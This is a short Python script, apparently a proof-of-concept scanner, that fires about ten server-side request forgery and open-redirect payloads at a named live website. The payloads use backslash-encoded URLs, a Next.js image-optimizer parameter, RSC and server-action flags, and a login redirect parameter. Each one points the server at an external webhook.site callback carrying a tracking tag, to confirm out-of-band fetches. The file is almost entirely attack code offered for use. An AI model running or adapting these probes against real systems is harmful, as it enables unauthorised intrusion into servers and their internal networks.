import requests, random, string

BASE = "https://demo.djangocfg.com"
PROVE = "https://en8q-xxxxxx.webhook.site/unique-id"

TAG = ''.join(random.choices(string.ascii_lowercase+string.digits, k=8))
print("TAG =", TAG)

def req(path):
    url = BASE + path
    try:
        r = requests.get(url, allow_redirects=False, timeout=8)
        return {
            "status": r.status_code,
            "loc": r.headers.get("Location"),
            "snippet": r.text[:200]
        }
    except Exception as e:
        return {"error": str(e)}

tests = {
    # baseline confirmed
    "proto_backslash": f"/%5C%5C{PROVE}?t={TAG}&p=proto_backslash",

    # image optimizer SSRF
    "image_ssrf_1": f"/_next/image?url=%5C%5C{PROVE}%3Ft%3D{TAG}%26p%3Dimage1& w=64&q=75",

    # image optimizer with protocol smuggling
    "image_ssrf_2": f"/_next/image?url=//{PROVE}%3Ft%3D{TAG}%26p%3Dimage2&w=64&q=75",

    # metadata extraction SSRF
    "meta_ssrf": f"/%5Chttps://{PROVE.replace('https://','')}/opengraph-image.png?t={TAG}&p=meta",

    # prefetch RSC SSRF
    "rsc_prefetch": f"/%5C{PROVE}?_rsc=1&t={TAG}&p=rsc",

    # server action SSRF attempt
    "server_action": f"/%5C{PROVE}?__NEXT_ACTION__=1&t={TAG}&p=action",

    # redirect-based SSRF smuggle
    "redirect_chain": f"/login?next=%5C%5C{PROVE}%3Ft%3D{TAG}%26p%3Dredir",

    # route handler auto-ssrf
    "api_route": f"/api/%5C%5C{PROVE}?t={TAG}&p=api",

    # dynamic seg trick
    "dyn_seg": f"/user/%5C%5C{PROVE}?t={TAG}&p=dyn",

    # og:image loader
    "og_image": f"/og/%5C%5C{PROVE}?t={TAG}&p=og"
}

for name, path in tests.items():
    print("\n▶", name, "->", path)
    print(req(path))
